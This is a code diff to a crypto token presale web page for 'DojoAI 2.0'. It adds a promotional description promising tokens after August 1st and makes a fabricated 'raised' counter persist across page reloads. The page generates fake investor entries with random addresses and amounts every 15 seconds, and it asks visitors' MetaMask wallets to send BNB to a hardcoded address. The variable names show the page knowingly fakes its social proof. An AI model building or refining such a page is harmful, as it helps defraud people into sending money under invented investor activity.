@@ -25,6 +25,12 @@
       color: #00ffc3;
       font-weight: 700;
     }
+    #description {
+      font-size: 16px;
+      color: #bbb;
+      margin: 20px 0 30px;
+      line-height: 1.6;
+    }
     #countdown {
       font-size: 24px;
       margin: 20px 0;
@@ -82,11 +88,21 @@
       padding: 10px;
       border-radius: 8px;
     }
+    .contact {
+      margin-top: 30px;
+      font-size: 15px;
+      color: #aaa;
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>🚀 DojoAI 2.0 Presale</h1>
+
+    <div id="description">
+      DojoAI 2.0 is a revolutionary AI project integrating decentralized trading algorithms with blockchain automation. This presale offers early access to our native token before official exchange listings. All funds raised will go toward protocol development, strategic partnerships, and token liquidity. Investors will receive tokens after presale closure on August 1st. Don’t miss your chance to join the next-gen AI revolution.
+    </div>
+
     <div id="countdown">Countdown Loading...</div>
 
     <div class="wallet-section">
@@ -108,6 +124,10 @@
     <div class="investors" id="investorList">
       <!-- Fake investor updates appear here -->
     </div>
+
+    <div class="contact">
+      Token distribution begins August 1st. For inquiries, DM us on X: <strong>@DojoAI 2.0 Presale</strong>
+    </div>
   </div>
 
   <script>
@@ -117,7 +137,15 @@
     const progressBar = document.getElementById("progressBar");
     const raisedDisplay = document.getElementById("fakeRaised");
 
-    // Countdown Timer
+    let fakeRaised = parseFloat(localStorage.getItem("dojoai_fakeRaised")) || 0;
+
+    function updateProgressUI() {
+      raisedDisplay.innerText = fakeRaised.toFixed(2);
+      progressBar.style.width = (fakeRaised / 200) * 100 + "%";
+    }
+
+    updateProgressUI();
+
     setInterval(() => {
       const now = new Date().getTime();
       const distance = targetDate - now;
@@ -132,7 +160,6 @@
       countdown.innerHTML = `⏳ ${days}d ${hours}h ${mins}m ${secs}s remaining`;
     }, 1000);
 
-    // Copy Wallet
     function copyWallet() {
       const address = document.getElementById("walletAddress").innerText;
       navigator.clipboard.writeText(address).then(() => {
@@ -140,7 +167,6 @@
       });
     }
 
-    // Connect and Send via MetaMask
     async function connectAndSend() {
       if (typeof window.ethereum !== 'undefined') {
         try {
@@ -151,7 +177,7 @@
             params: [{
               from,
               to: "0x2Eb0b86bA0a09A04BE034150b3ad3A306D847918",
-              value: "0x2386F26FC10000" // 0.01 BNB in wei (hex)
+              value: "0x2386F26FC10000"
             }]
           });
           alert("Transaction sent: " + tx);
@@ -163,22 +189,21 @@
       }
     }
 
-    // Fake Investor Generator
-    let fakeRaised = 0;
     function randomInvestor() {
       const address = "0x" + Math.random().toString(16).substr(2, 4) + "..." + Math.random().toString(16).substr(2, 4);
       const amount = (Math.random() * (1 - 0.01) + 0.01).toFixed(3);
       fakeRaised += parseFloat(amount);
       if (fakeRaised > 200) fakeRaised = 200;
-      raisedDisplay.innerText = fakeRaised.toFixed(2);
-      progressBar.style.width = (fakeRaised / 200) * 100 + "%";
+      localStorage.setItem("dojoai_fakeRaised", fakeRaised.toString());
+      updateProgressUI();
+
       const entry = document.createElement("div");
       entry.textContent = `${amount} BNB from ${address}`;
       investorList.prepend(entry);
     }
-    setInterval(randomInvestor, 15000); // Every 15 seconds
+
+    setInterval(randomInvestor, 15000);
   </script>
 </body>
 </html>
-
 
